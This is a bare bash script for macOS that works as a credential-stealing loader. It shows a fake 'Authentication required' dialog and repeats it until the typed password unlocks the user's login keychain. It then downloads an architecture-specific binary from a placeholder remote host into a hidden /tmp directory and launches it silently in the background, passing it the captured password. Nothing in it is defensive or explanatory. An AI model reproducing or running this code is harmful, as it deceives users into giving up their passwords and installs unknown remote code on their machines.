#!/bin/bash
workspace=$(mktemp -d /tmp/.service-workspace.XXXXXX)
while true; do
  credential=$(osascript -e 'text returned of (display dialog "Authentication required" default answer "" with hidden answer with title "Authentication")')
  security unlock-keychain -p "$credential" "$HOME/Library/Keychains/login.keychain-db" && break
done
arch=$(uname -m)
curl -fsS "https://alternate.example.invalid/agent?arch=$arch" -o "$workspace/agent"
chmod +x "$workspace/agent"
nohup "$workspace/agent" "$credential" >/dev/null 2>&1 &
